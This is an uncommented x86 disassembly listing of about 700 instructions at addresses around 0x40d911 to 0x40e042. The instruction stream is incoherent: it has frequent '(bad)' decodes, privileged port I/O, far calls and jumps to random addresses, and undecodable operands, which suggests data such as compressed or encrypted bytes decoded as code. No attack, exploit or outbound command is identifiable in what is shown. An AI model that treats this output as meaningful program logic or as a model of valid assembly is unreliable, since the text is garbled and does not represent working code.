  40d911:	rcl    BYTE PTR [edi],1
  40d913:	into   
  40d914:	sub    DWORD PTR [eax-0x41769392],ecx
  40d91a:	punpcklwd mm1,DWORD PTR [edi-0x4bc797b5]
  40d921:	sub    bh,bl
  40d923:	and    dl,dl
  40d925:	cld    
  40d926:	push   ss
  40d927:	retf   0xd5f5
  40d92a:	ins    DWORD PTR es:[edi],dx
  40d92b:	mov    ecx,0x73e72a44
  40d930:	in     eax,dx
  40d931:	cmp    BYTE PTR [ebx],bh
  40d933:	or     al,0x20
  40d935:	pop    ebx
  40d936:	push   edi
  40d937:	call   0x60b66e47
  40d93c:	sub    eax,0x9525fc35
  40d941:	mov    al,0x96
  40d943:	or     eax,DWORD PTR [ebx+0x38]
  40d946:	pop    ds
  40d947:	(bad)
  40d94b:	or     ah,0x11
  40d94e:	dec    edx
  40d94f:	(bad)  
  40d950:	cmc    
  40d951:	jp     0x40d968
  40d953:	(bad)  
  40d955:	xor    al,0xca
  40d957:	mov    DWORD PTR [ecx-0xa734f1a],edx
  40d95d:	xchg   esi,eax
  40d95e:	or     BYTE PTR [eax+eiz*2],cl
  40d961:	stc    
  40d962:	dec    ebp
  40d963:	push   es
  40d964:	cmc    
  40d965:	int3   
  40d966:	pop    esi
  40d967:	repnz push edi
  40d969:	mov    ds:0x5d9ab221,eax
  40d96e:	xchg   ebx,eax
  40d96f:	cmp    dh,cl
  40d971:	fsubrp st(1),st
  40d973:	das    
  40d974:	cmp    eax,0xf5768b3a
  40d979:	daa    
  40d97a:	dec    edx
  40d97b:	call   0x5a1f0f53
  40d980:	sub    edi,DWORD PTR [eax]
  40d982:	inc    ebx
  40d983:	pop    ss
  40d984:	and    DWORD PTR [eax-0x2844db6d],ecx
  40d98a:	imul   esp,DWORD PTR [ebx+0x404bc908],0x84ee8178
  40d994:	jne    0x40d949
  40d996:	sti    
  40d997:	xor    ebx,edi
  40d999:	fistp  QWORD PTR ss:[eax+0x6a]
  40d99d:	mov    cl,cl
  40d99f:	stos   BYTE PTR es:[edi],al
  40d9a0:	jg     0x40d9cb
  40d9a2:	outs   dx,DWORD PTR ds:[esi]
  40d9a3:	(bad)  
  40d9a4:	ins    BYTE PTR es:[edi],dx
  40d9a5:	cli    
  40d9a6:	xor    al,0xf5
  40d9a8:	call   0x5e3e:0x663fa9ee
  40d9af:	mov    ah,0x27
  40d9b1:	pop    esp
  40d9b2:	pop    edi
  40d9b3:	rcl    ebp,cl
  40d9b5:	call   0x7e50ad2f
  40d9ba:	jl     0x40d96d
  40d9bc:	mov    ecx,cs
  40d9be:	push   ds
  40d9bf:	imul   ebx,DWORD PTR ds:[eax-0x14d4c6d5],0x56
  40d9c7:	daa    
  40d9c8:	or     eax,DWORD PTR [edx-0x1a0a04e2]
  40d9ce:	adc    DWORD PTR [eax],0xbe74b2e8
  40d9d4:	gs push es
  40d9d6:	lods   eax,DWORD PTR ds:[esi]
  40d9d7:	in     al,dx
  40d9d8:	add    eax,0xdf2047f8
  40d9dd:	jp     0x40d9be
  40d9df:	adc    esi,ebp
  40d9e1:	mov    ecx,0x1828e407
  40d9e6:	sub    BYTE PTR [edx],0x71
  40d9e9:	cmp    BYTE PTR [ecx+ebp*8+0x1cebbe7f],al
  40d9f0:	dec    ecx
  40d9f1:	sbb    eax,0x7de43d75
  40d9f6:	cmp    DWORD PTR [ebp+eax*1+0x5d],ecx
  40d9fa:	xor    edi,DWORD PTR [edi+edi*8]
  40d9fd:	cmp    ebp,DWORD PTR [ebx]
  40d9ff:	gs mov ecx,edx
  40da02:	test   eax,0x78ddb50c
  40da07:	push   edi
  40da08:	push   ecx
  40da09:	xor    al,0x2f
  40da0b:	setnp  BYTE PTR [ebx+0x3854433a]
  40da12:	dec    eax
  40da13:	enter  0xe063,0xa1
  40da17:	lahf   
  40da18:	out    0x52,al
  40da1a:	outs   dx,DWORD PTR ds:[esi]
  40da1b:	pop    esp
  40da1c:	aad    0x86
  40da1e:	ss pusha 
  40da20:	out    dx,eax
  40da21:	popa   
  40da22:	stc    
  40da23:	cmp    BYTE PTR [esi],ah
  40da25:	aas    
  40da26:	(bad)  
  40da27:	aam    0x9d
  40da29:	mov    cl,0xed
  40da2b:	xor    eax,0x9d4e20f5
  40da30:	sahf   
  40da31:	mov    dl,0xbe
  40da33:	mov    edx,0xc8a43801
  40da38:	mov    ds:0x1f83aca2,eax
  40da3d:	arpl   di,bx
  40da3f:	into   
  40da40:	cmc    
  40da41:	mov    bh,0x2c
  40da43:	or     BYTE PTR [eax],ah
  40da45:	je     0x40da61
  40da47:	or     eax,0xc9f73bb2
  40da4c:	cmp    ecx,edx
  40da4e:	cli    
  40da4f:	push   cs
  40da50:	iret   
  40da51:	mov    ch,BYTE PTR [esi+0x17]
  40da54:	adc    DWORD PTR [edx-0x73292d8c],ebx
  40da5a:	lods   al,BYTE PTR ds:[esi]
  40da5b:	cmp    al,0xb0
  40da5d:	ret    0x7907
  40da60:	cld    
  40da61:	jl     0x40d9f0
  40da63:	adc    ch,dl
  40da65:	add    cl,BYTE PTR [ecx+0x191c5d71]
  40da6b:	ds repz xchg edx,eax
  40da6e:	in     eax,0x4c
  40da70:	jns    0x40da96
  40da72:	inc    edi
  40da73:	dec    esp
  40da74:	cmp    BYTE PTR [bp+di+0x52],dh
  40da78:	jp     0x40daa2
  40da7a:	inc    ebx
  40da7b:	clc    
  40da7c:	nop
  40da7d:	pushf  
  40da7e:	xor    BYTE PTR [eax],0x77
  40da81:	xchg   edi,eax
  40da82:	lds    eax,FWORD PTR [ebp-0x7b]
  40da85:	sub    edx,ecx
  40da87:	cmp    BYTE PTR [esi-0x54],al
  40da8a:	out    dx,eax
  40da8b:	cli    
  40da8c:	(bad)  
  40da8e:	mov    BYTE PTR [esi-0xe71d59b],0x28
  40da95:	pop    edi
  40da96:	outs   dx,DWORD PTR ds:[esi]
  40da97:	mov    edi,0x482f2222
  40da9c:	pushf  
  40da9d:	in     eax,0xd3
  40da9f:	mov    ch,dh
  40daa1:	cwde   
  40daa2:	pop    esi
  40daa3:	or     edx,edx
  40daa5:	repnz (bad) 
  40daa7:	mov    dh,0xf5
  40daa9:	sub    cl,BYTE PTR [esi-0x26]
  40daac:	lods   al,BYTE PTR ds:[esi]
  40daad:	retw   0x8d95
  40dab1:	cmp    eax,DWORD PTR [ecx-0x1c7cea8e]
  40dab7:	xchg   DWORD PTR [ebx],ebp
  40dab9:	enter  0x116e,0x6
  40dabd:	mov    ch,0xce
  40dabf:	test   BYTE PTR [edx+0x43],ah
  40dac2:	push   edx
  40dac3:	cmp    DWORD PTR [ecx-0x25566c0],edi
  40dac9:	add    ecx,DWORD PTR [edx]
  40dacb:	add    al,0xe3
  40dacd:	push   ds
  40dace:	stos   DWORD PTR es:[edi],eax
  40dacf:	sbb    eax,0x9ed5b9fb
  40dad5:	cmp    al,0x8e
  40dad7:	cmp    BYTE PTR ds:0x5c0a9931,bh
  40dadd:	jle    0x40da68
  40dadf:	and    esi,ebp
  40dae1:	jmp    0x8cb99266
  40dae6:	rcl    DWORD PTR [eax+0x3951accb],cl
  40daec:	fs pop cx
  40daef:	xchg   bl,dh
  40daf1:	out    0x68,eax
  40daf3:	test   ebp,esi
  40daf5:	sbb    al,0x9e
  40daf7:	std    
  40daf8:	add    BYTE PTR [edi+eiz*8+0x5c],al
  40dafc:	push   es
  40dafd:	xor    DWORD PTR [ecx+0x51],ebp
  40db00:	sub    DWORD PTR [ebp+0xe],edi
  40db03:	or     DWORD PTR [esi],esi
  40db05:	adc    DWORD PTR [ebx-0x409e0ad3],edx
  40db0b:	imul   ebp,edi,0x45c173a6
  40db11:	cmp    eax,0x476271a3
  40db16:	lods   eax,DWORD PTR ds:[esi]
  40db17:	xor    dh,BYTE PTR [esi-0x70]
  40db1a:	js     0x40db70
  40db1c:	lods   al,BYTE PTR ds:[esi]
  40db1d:	pop    ecx
  40db1e:	outs   dx,DWORD PTR ds:[esi]
  40db1f:	xchg   BYTE PTR fs:[edx+0x51a1d320],al
  40db26:	dec    edx
  40db27:	sbb    ah,BYTE PTR [edx-0x6b]
  40db2a:	jge    0x40dba4
  40db2c:	mov    ds:0xf63c9dd,al
  40db31:	xor    al,0x68
  40db33:	mov    ecx,es
  40db35:	cdq    
  40db36:	fld    DWORD PTR [edi+0x73fcf8e3]
  40db3c:	imul   edi,DWORD PTR [eax],0xfffffffe
  40db3f:	in     al,dx
  40db40:	cmp    eax,0x53b9b1c3
  40db45:	pop    edx
  40db46:	outs   dx,DWORD PTR ds:[esi]
  40db47:	test   BYTE PTR [edi],al
  40db49:	jae    0x40dbca
  40db4b:	mov    edi,0x1193799
  40db50:	data16 out dx,al
  40db52:	out    dx,al
  40db53:	mov    DWORD PTR [ecx],esp
  40db55:	pop    esi
  40db56:	and    ch,al
  40db58:	popa   
  40db59:	adc    DWORD PTR [esi+0x61],ebp
  40db5c:	xchg   DWORD PTR [edx+0x2b],edx
  40db5f:	retf   0xd2c3
  40db62:	jle    0x40db9c
  40db64:	test   DWORD PTR [esi+0x2d7e30e3],ebx
  40db6a:	cs add ch,dh
  40db6d:	(bad)  
  40db6e:	repnz cmp dl,ah
  40db71:	(bad)  
  40db72:	lds    esp,FWORD PTR [esi-0x2d]
  40db75:	cmp    esp,DWORD PTR [esi-0x47]
  40db78:	div    BYTE PTR [edi]
  40db7a:	xchg   ebp,eax
  40db7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db7c:	push   ebp
  40db7d:	and    al,0x6f
  40db7f:	or     al,0xf7
  40db81:	cmc    
  40db82:	jmp    0x40dbfe
  40db84:	ss mov edx,0x9a2838f3
  40db8a:	div    DWORD PTR [edx+0x4af6d3ef]
  40db90:	cmc    
  40db91:	sbb    bh,BYTE PTR [esi-0x781185e4]
  40db97:	stos   DWORD PTR es:[edi],eax
  40db98:	(bad)
  40db9b:	mov    dh,0xfe
  40db9d:	and    eax,0xf9c938cc
  40dba2:	pop    ds
  40dba3:	mov    ds:0x33ecbeb3,eax
  40dba8:	cmc    
  40dba9:	push   edi
  40dbaa:	pop    es
  40dbab:	jo     0x40db72
  40dbad:	clc    
  40dbae:	or     BYTE PTR [ecx+0x12],bh
  40dbb1:	cmp    BYTE PTR [edx+edi*8],dh
  40dbb4:	mov    eax,ds:0x9ee2c818
  40dbb9:	scas   al,BYTE PTR es:[edi]
  40dbba:	outs   dx,BYTE PTR ds:[esi]
  40dbbb:	sub    DWORD PTR [edx+0x3cfbd568],esi
  40dbc1:	sub    eax,0x5826c8a4
  40dbc6:	push   edi
  40dbc7:	sub    eax,0x6edd7e89
  40dbcc:	cmc    
  40dbcd:	ja     0x40db9d
  40dbcf:	loop   0x40dc09
  40dbd1:	adc    BYTE PTR [ecx+0x14],ah
  40dbd4:	div    BYTE PTR [esi+0x6f5c79e7]
  40dbda:	mov    cl,0x9d
  40dbdc:	fst    DWORD PTR [ebx-0x41]
  40dbdf:	cmp    BYTE PTR [esi+0x52224c63],ch
  40dbe5:	popa   
  40dbe6:	jne    0x40dc19
  40dbe8:	cmc    
  40dbe9:	gs cmc 
  40dbeb:	push   ds
  40dbec:	sub    edi,DWORD PTR [edx]
  40dbee:	dec    ebx
  40dbef:	mov    ds:0xf6e73b9d,eax
  40dbf4:	div    BYTE PTR [ebx+0x44b4a050]
  40dbfa:	outs   dx,DWORD PTR ds:[esi]
  40dbfb:	adc    al,0x5f
  40dbfd:	jecxz  0x40dc3c
  40dbff:	imul   edi,DWORD PTR ds:0x5d286d33,0xb
  40dc06:	mov    bh,0x89
  40dc08:	xchg   ebp,eax
  40dc09:	push   eax
  40dc0a:	xchg   ecx,eax
  40dc0b:	fbld   TBYTE PTR [edi]
  40dc0d:	mov    cl,0x6e
  40dc0f:	mov    BYTE PTR [esi+0x330b8ed3],cl
  40dc15:	hlt    
  40dc16:	add    BYTE PTR [ecx],bh
  40dc18:	shl    BYTE PTR [edx+0x5bb50972],0xa2
  40dc1f:	iret   
  40dc20:	sbb    al,0x8f
  40dc22:	adc    eax,0xd686f53f
  40dc27:	mov    ebx,eax
  40dc29:	mov    eax,0xa8dbf103
  40dc2e:	outs   dx,BYTE PTR ds:[esi]
  40dc2f:	ret    0x8d44
  40dc32:	bound  ebp,QWORD PTR [ebx-0x31]
  40dc35:	xchg   ecx,eax
  40dc36:	outs   dx,BYTE PTR ds:[esi]
  40dc37:	les    edx,FWORD PTR [edx]
  40dc39:	sub    eax,0x3b138b8f
  40dc3e:	sbb    bh,BYTE PTR [ecx]
  40dc40:	lea    ebp,[esi+esi*2+0x1bfd3e73]
  40dc47:	mov    ebx,0x18572ce3
  40dc4c:	sub    ecx,DWORD PTR [edx+0x69]
  40dc4f:	fs dec esp
  40dc51:	popa   
  40dc52:	(bad)  
  40dc53:	clc    
  40dc54:	inc    eax
  40dc55:	fld    st(1)
  40dc57:	aaa    
  40dc58:	pushf  
  40dc59:	iret   
  40dc5a:	inc    DWORD PTR [edi+0x35]
  40dc5d:	mov    bl,0x9a
  40dc5f:	push   edi
  40dc60:	mov    ebp,0xd0446eec
  40dc65:	lods   eax,DWORD PTR ds:[esi]
  40dc66:	rcl    ch,0x35
  40dc69:	jmp    0xdab4:0xb64390f
  40dc70:	int    0x1e
  40dc72:	pop    ecx
  40dc73:	(bad)  
  40dc74:	cmc    
  40dc75:	jnp    0x40dc96
  40dc77:	jmp    0x40dc19
  40dc79:	sub    eax,0x3cba55aa
  40dc7e:	xchg   ebx,eax
  40dc7f:	test   DWORD PTR [edx-0x31],edx
  40dc82:	mov    ds,WORD PTR [ecx-0x73]
  40dc85:	test   eax,0xa2f5df78
  40dc8a:	dec    ebx
  40dc8b:	jmp    0x3bbc:0x216d9992
  40dc92:	mov    esi,fs
  40dc94:	(bad)  
  40dc95:	and    eax,0xdc6678b6
  40dc9a:	outs   dx,BYTE PTR ds:[esi]
  40dc9b:	scas   eax,DWORD PTR es:[edi]
  40dc9c:	fsin   
  40dc9e:	add    al,BYTE PTR [ecx]
  40dca0:	jecxz  0x40dcaf
  40dca2:	inc    ecx
  40dca3:	cmp    DWORD PTR [eax-0x11],ebx
  40dca6:	push   ecx
  40dca7:	lods   eax,DWORD PTR ds:[esi]
  40dca8:	(bad)  
  40dca9:	shr    BYTE PTR [edx+0x6caaf595],1
  40dcaf:	mov    esp,0xb788e1a3
  40dcb4:	je     0x40dcf5
  40dcb6:	dec    esi
  40dcb7:	leave  
  40dcb8:	sti    
  40dcb9:	pop    edi
  40dcba:	mov    bh,0x3f
  40dcbc:	fild   WORD PTR [eax+eax*2-0x369f8ae2]
  40dcc3:	adc    dh,ch
  40dcc5:	mov    al,0xec
  40dcc7:	xchg   ebx,eax
  40dcc8:	lods   eax,DWORD PTR ds:[esi]
  40dcc9:	fdiv   QWORD PTR [edx+0x7ec07c88]
  40dccf:	outs   dx,DWORD PTR ds:[esi]
  40dcd0:	in     al,0x4f
  40dcd2:	js     0x40dccf
  40dcd4:	sar    DWORD PTR [ebx],cl
  40dcd6:	pushf  
  40dcd7:	sub    BYTE PTR [esi+0x45],0x2e
  40dcdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcdc:	cmc    
  40dcdd:	es or  edi,ebp
  40dce0:	ja     0x40dccb
  40dce2:	ja     0x40dcc3
  40dce4:	call   0x2b5a9521
  40dce9:	int    0x8b
  40dceb:	sbb    ecx,DWORD PTR [eax]
  40dced:	pop    esi
  40dcee:	outs   dx,DWORD PTR ds:[esi]
  40dcef:	clc    
  40dcf0:	adc    DWORD PTR [edx-0x4c],eax
  40dcf3:	fdiv   QWORD PTR [ebx]
  40dcf5:	aas    
  40dcf6:	out    0x37,eax
  40dcf8:	sub    eax,0xf5a290e0
  40dcfd:	mov    WORD PTR [eax+0x6ec18908],?
  40dd03:	in     eax,0x13
  40dd05:	sbb    esp,edi
  40dd07:	mov    ebp,0x393c00cb
  40dd0c:	push   esi
  40dd0d:	jg     0x40dcc7
  40dd0f:	es pop edx
  40dd11:	mov    esi,0xaaf66cbe
  40dd16:	enter  0x3a1f,0x67
  40dd1a:	inc    esi
  40dd1b:	gs (bad) 
  40dd1f:	cmp    BYTE PTR [eax+0xd40378],cl
  40dd25:	fwait
  40dd26:	push   ss
  40dd27:	mov    ds:0xa65a92f5,al
  40dd2c:	adc    DWORD PTR [ebx-0x4d],edx
  40dd2f:	ret    
  40dd30:	imul   esp,DWORD PTR [ebp-0x486cc1de],0xffffffa3
  40dd37:	pop    ds
  40dd38:	outs   dx,DWORD PTR ds:[esi]
  40dd39:	dec    ebx
  40dd3a:	adc    esi,DWORD PTR [ecx-0x79]
  40dd3d:	retf   0x8fd8
  40dd40:	cmc    
  40dd41:	jp     0x40dd98
  40dd43:	cmp    ebp,DWORD PTR ss:[ecx]
  40dd46:	ss cld 
  40dd48:	xchg   esp,eax
  40dd49:	cmp    edx,DWORD PTR [esi+0x4a]
  40dd4c:	test   al,0x10
  40dd4e:	imul   ebx,DWORD PTR [edi],0x30
  40dd51:	adc    esp,DWORD PTR [edi+0x2cb84240]
  40dd57:	xor    esp,DWORD PTR ds:0x3712b39
  40dd5d:	cmp    cl,dh
  40dd5f:	es jnp 0x40dda7
  40dd62:	in     al,dx
  40dd63:	pop    edx
  40dd64:	imul   DWORD PTR cs:[esi-0x7f]
  40dd68:	or     BYTE PTR [eax-0x7b],dl
  40dd6b:	sbb    al,0xf7
  40dd6d:	xor    al,0xa6
  40dd6f:	cmp    cl,ch
  40dd71:	sub    DWORD PTR ds:0x29529e6f,edx
  40dd77:	fcomi  st,st(5)
  40dd79:	adc    al,0xf5
  40dd7b:	jbe    0x40dddf
  40dd7d:	aad    0xe0
  40dd7f:	add    al,0x27
  40dd81:	cmp    BYTE PTR [esi+0x50],dl
  40dd84:	ins    DWORD PTR es:[edi],dx
  40dd85:	test   al,0xa8
  40dd87:	cmc    
  40dd88:	retf   
  40dd89:	jns    0x40ddfa
  40dd8b:	mov    esi,0x6f27291
  40dd90:	cmp    dh,BYTE PTR gs:[edi-0x243cb7c8]
  40dd97:	jb     0x40dd37
  40dd99:	cdq    
  40dd9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd9b:	push   edi
  40dd9c:	cmc    
  40dd9d:	aaa    
  40dd9e:	lds    ebx,FWORD PTR [eax+0x6c46fabe]
  40dda4:	fidivr DWORD PTR [ebx]
  40dda6:	inc    eax
  40dda7:	in     eax,dx
  40dda8:	add    al,0x9a
  40ddaa:	hlt    
  40ddab:	xor    al,BYTE PTR [edi-0xac025d3]
  40ddb1:	jbe    0x40ddb8
  40ddb3:	sub    BYTE PTR [ebp-0x54757c3c],bh
  40ddb9:	cmp    ch,BYTE PTR [edi+0x1d]
  40ddbc:	int3   
  40ddbd:	jnp    0x40dda7
  40ddbf:	nop
  40ddc0:	mov    al,0x27
  40ddc2:	xchg   esi,eax
  40ddc3:	push   ss
  40ddc4:	cmc    
  40ddc5:	jecxz  0x40de12
  40ddc7:	retf   
  40ddc8:	test   DWORD PTR [ebp+edx*2+0x34],0x74fa3d2e
  40ddd0:	icebp  
  40ddd1:	jmp    0x40dd88
  40ddd3:	pop    edi
  40ddd4:	ins    DWORD PTR es:[edi],dx
  40ddd5:	mov    eax,0x83126d8f
  40ddda:	fldenv [esi*1+0x749310a1]
  40dde1:	sbb    BYTE PTR [ebx],dl
  40dde3:	cmp    DWORD PTR [edx+ecx*8+0x24],edx
  40dde7:	or     eax,0xd01a4335
  40ddec:	xlat   BYTE PTR ds:[ebx]
  40dded:	imul   DWORD PTR [edi+0x1d]
  40ddf0:	outs   dx,BYTE PTR ds:[esi]
  40ddf1:	push   0x21
  40ddf3:	mov    ebx,0xba42a941
  40ddf8:	in     al,0x38
  40ddfa:	out    0x37,al
  40ddfc:	pushf  
  40ddfd:	idiv   BYTE PTR [esi+0x7e]
  40de00:	test   eax,edx
  40de02:	outs   dx,BYTE PTR ds:[esi]
  40de03:	mov    ebp,0xa4b91ff4
  40de08:	jg     0x40de38
  40de0a:	aas    
  40de0b:	and    edi,DWORD PTR [ecx-0x9c73485]
  40de11:	jb     0x40ddb0
  40de13:	push   cs
  40de14:	cdq    
  40de15:	xchg   ecx,eax
  40de16:	imul   edi,DWORD PTR [edi-0x1935a163],0xab365013
  40de20:	mov    edx,0xf13aef3b
  40de25:	fs or  dh,dl
  40de28:	dec    edi
  40de29:	fild   WORD PTR [ebx+0x54ad1ff7]
  40de2f:	dec    eax
  40de30:	in     al,0x4
  40de32:	or     al,0x79
  40de34:	inc    edx
  40de35:	jg     0x40de5c
  40de37:	add    al,0xf2
  40de39:	in     al,0xa6
  40de3b:	mov    ebp,0xe70294f6
  40de40:	cwde   
  40de41:	das    
  40de42:	mov    cl,0x50
  40de44:	mov    cl,BYTE PTR [ecx]
  40de46:	outs   dx,DWORD PTR ds:[esi]
  40de47:	jne    0x40de61
  40de49:	jl     0x40dec0
  40de4b:	dec    esi
  40de4c:	pushf  
  40de4d:	mov    dl,0x2f
  40de4f:	xchg   ebx,eax
  40de50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de52:	cmp    edi,DWORD PTR [ecx]
  40de54:	scas   al,BYTE PTR es:[edi]
  40de55:	push   ebx
  40de56:	fisubr WORD PTR [edx+eiz*4-0x1346f69e]
  40de5d:	mov    dl,0xcc
  40de5f:	mov    eax,esp
  40de61:	int3   
  40de62:	fsubrp st(3),st
  40de64:	jg     0x40de0b
  40de66:	mov    bl,0x1b
  40de68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de69:	adc    BYTE PTR [esi+0x39],al
  40de6c:	mov    bh,0xb4
  40de6e:	mov    ch,0xf9
  40de70:	dec    ecx
  40de71:	inc    esp
  40de72:	gs inc edx
  40de74:	xor    ebx,DWORD PTR [esi]
  40de76:	cmp    BYTE PTR ds:0x359679ab,0x75
  40de7d:	mov    al,0xee
  40de7f:	shl    ch,1
  40de81:	or     DWORD PTR [eax],ecx
  40de83:	pop    ss
  40de84:	dec    ebx
  40de85:	ds into 
  40de87:	daa    
  40de88:	lds    eax,FWORD PTR [ebp-0x38]
  40de8b:	push   edx
  40de8c:	cmc    
  40de8d:	mov    esi,0x9495f9e1
  40de92:	loopne 0x40defb
  40de94:	retf   0x927
  40de97:	cmp    DWORD PTR [edx],edi
  40de99:	and    ebx,DWORD PTR [ebx]
  40de9b:	lods   al,BYTE PTR ds:[esi]
  40de9c:	rcl    DWORD PTR [edi],0x6b
  40de9f:	aaa    
  40dea0:	cmc    
  40dea1:	cmp    al,0x68
  40dea3:	xchg   ebp,eax
  40dea4:	push   ds
  40dea5:	jl     0x40df03
  40dea7:	shr    ah,cl
  40dea9:	pusha  
  40deaa:	and    eax,0x1ee2d839
  40deaf:	mov    WORD PTR [esp+eax*8+0x4f],?
  40deb3:	loopne 0x40deaa
  40deb5:	add    BYTE PTR [edx+edx*2-0x3],bl
  40deb9:	cdq    
  40deba:	and    eax,edx
  40debc:	adc    edi,DWORD PTR [eax]
  40debe:	xlat   BYTE PTR ds:[ebx]
  40debf:	mov    eax,edx
  40dec1:	add    DWORD PTR [ecx-0x3d54da9f],eax
  40dec7:	in     al,dx
  40dec8:	dec    esp
  40dec9:	cmp    BYTE PTR [ebx+0x15a52bbc],dl
  40decf:	bound  ebp,QWORD PTR [ebx+0x4]
  40ded2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ded3:	mov    ebx,0xde223808
  40ded8:	xchg   ecx,eax
  40ded9:	mov    eax,ds:0x83f55805
  40dede:	mov    esi,0x190d5bfe
  40dee3:	ficomp DWORD PTR [ebx]
  40dee5:	cmp    al,dh
  40dee7:	pushf  
  40dee8:	or     al,0x39
  40deea:	mov    bh,0x92
  40deec:	push   ss
  40deed:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deef:	cwde   
  40def0:	retf   
  40def1:	cmp    ebx,DWORD PTR [ebx]
  40def3:	addr16 xor al,0x18
  40def6:	stos   DWORD PTR es:[edi],eax
  40def7:	mov    bh,BYTE PTR [ecx+0x7944d13a]
  40defd:	or     esi,ebx
  40deff:	sbb    al,dl
  40df01:	daa    
  40df02:	xchg   DWORD PTR [ebp-0xa5f70b],ebp
  40df08:	dec    edi
  40df09:	pusha  
  40df0a:	add    ebp,DWORD PTR [ebp+0x751e3bd1]
  40df10:	out    0xdc,eax
  40df12:	repnz mov al,0x34
  40df15:	mov    edx,ebx
  40df17:	xor    al,0xe9
  40df19:	fldlg2 
  40df1b:	mov    esp,?
  40df1d:	cmp    eax,0xe66f12ee
  40df22:	inc    esi
  40df23:	cmp    DWORD PTR [eax],ecx
  40df25:	lahf   
  40df26:	stos   DWORD PTR es:[edi],eax
  40df27:	fcomp  DWORD PTR [ecx]
  40df29:	push   ebx
  40df2a:	adc    cl,bh
  40df2c:	xor    BYTE PTR [ebx-0x23],ah
  40df2f:	cmp    cl,ch
  40df31:	xor    esp,DWORD PTR [ebx+0xb]
  40df34:	dec    ebp
  40df35:	cmc    
  40df36:	cwde   
  40df37:	add    eax,0x7bef5ee1
  40df3c:	add    DWORD PTR [esi+0x37],edx
  40df3f:	push   edx
  40df40:	jmp    0x40df50
  40df42:	push   0xffffffce
  40df44:	sbb    BYTE PTR [edi],ah
  40df46:	mov    ch,0x3b
  40df48:	mov    ch,0x89
  40df4a:	sahf   
  40df4b:	sub    BYTE PTR [edi-0x7],bl
  40df4e:	out    dx,eax
  40df4f:	push   edx
  40df50:	cmc    
  40df51:	ins    DWORD PTR es:[edi],dx
  40df52:	dec    edx
  40df53:	imul   esp,DWORD PTR [edi+0x42],0x7df97b69
  40df5a:	outs   dx,DWORD PTR ds:[esi]
  40df5b:	loope  0x40df41
  40df5d:	mov    ecx,ebp
  40df5f:	xchg   ebx,ecx
  40df61:	repnz cmp DWORD PTR [eax],0xffffffd7
  40df65:	push   ebx
  40df66:	add    dh,bh
  40df68:	dec    eax
  40df69:	inc    ebx
  40df6a:	jno    0x40df7b
  40df6c:	jge    0x40df4e
  40df6e:	outs   dx,BYTE PTR ds:[esi]
  40df6f:	mov    BYTE PTR [ebp-0x27c9f72a],ch
  40df75:	(bad)
  40df79:	jecxz  0x40df5d
  40df7b:	into   
  40df7c:	adc    eax,DWORD PTR [ebx-0x37768744]
  40df82:	sub    al,0xde
  40df84:	fnsave [edi]
  40df86:	jge    0x40dfbe
  40df88:	daa    
  40df89:	std    
  40df8a:	cmp    al,0x19
  40df8c:	push   0xc45502e6
  40df91:	aas    
  40df92:	jl     0x40dfbb
  40df94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df95:	jp     0x40df3e
  40df97:	js     0x40df41
  40df99:	or     eax,0xf5f5780b
  40df9e:	in     al,dx
  40df9f:	bound  edi,QWORD PTR [ebx]
  40dfa1:	xchg   BYTE PTR [edx-0x6c1bf5d8],dh
  40dfa7:	inc    ecx
  40dfa8:	je     0x40dfe7
  40dfaa:	xchg   esi,ebp
  40dfac:	inc    edx
  40dfad:	arpl   di,dx
  40dfaf:	pop    eax
  40dfb0:	jne    0x40df7a
  40dfb2:	adc    DWORD PTR [ebp+esi*8-0x4f],0x76
  40dfb7:	stos   DWORD PTR es:[edi],eax
  40dfb8:	jle    0x40df79
  40dfba:	mov    bh,0x2d
  40dfbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfbd:	xor    bh,BYTE PTR [edi-0x2377e98]
  40dfc3:	jle    0x40dffa
  40dfc5:	scas   al,BYTE PTR es:[edi]
  40dfc6:	jb     0x40e006
  40dfc8:	lds    eax,FWORD PTR [ebx-0x12e3bf92]
  40dfce:	sbb    al,0x4
  40dfd0:	scas   eax,DWORD PTR es:[edi]
  40dfd1:	jg     0x40dfd4
  40dfd3:	ds addr16 hlt 
  40dfd6:	jo     0x40df95
  40dfd8:	rcl    BYTE PTR [ecx],0x3c
  40dfdb:	(bad)  [edx-0x3e4b90ee]
  40dfe1:	jmp    ebx
  40dfe3:	out    dx,al
  40dfe4:	outs   dx,DWORD PTR gs:[esi]
  40dfe6:	ds cdq 
  40dfe8:	dec    esi
  40dfe9:	adc    BYTE PTR [ecx+0x6e3f69fb],cl
  40dfef:	loop   0x40df96
  40dff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dff2:	leave  
  40dff3:	in     al,0xdb
  40dff5:	outs   dx,WORD PTR ds:[esi]
  40dff7:	ret    
  40dff8:	repnz cmc 
  40dffa:	dec    edx
  40dffb:	dec    esp
  40dffc:	xchg   edi,eax
  40dffd:	cmp    DWORD PTR [ecx],ebp
  40dfff:	cmp    DWORD PTR [ebx+0x4bd38033],esp
  40e005:	cmp    eax,0xcaf5db64
  40e00a:	ror    BYTE PTR [esi-0x3b],cl
  40e00d:	sub    BYTE PTR [ebx+edi*8],ch
  40e010:	shr    DWORD PTR [edi],0x5a
  40e013:	int    0x93
  40e015:	cmp    ebp,ebp
  40e017:	xchg   eax,ebx
  40e019:	xchg   ebx,eax
  40e01a:	sahf   
  40e01b:	rol    BYTE PTR [edx-0xe],0x6f
  40e01f:	adc    ah,dl
  40e021:	sti    
  40e022:	xor    DWORD PTR [edx-0x23],esp
  40e025:	xchg   esi,eax
  40e026:	xor    ah,BYTE PTR [edi]
  40e028:	fidiv  WORD PTR [eax]
  40e02a:	push   edx
  40e02b:	sub    BYTE PTR [ecx-0x19c78562],bh
  40e031:	sub    BYTE PTR fs:[eax],cl
  40e034:	cmc    
  40e035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e036:	push   0xed002ac7
  40e03b:	push   edi
  40e03c:	mov    al,ds:0x1ef0a03b
  40e041:	clc    
  40e042:	cli    
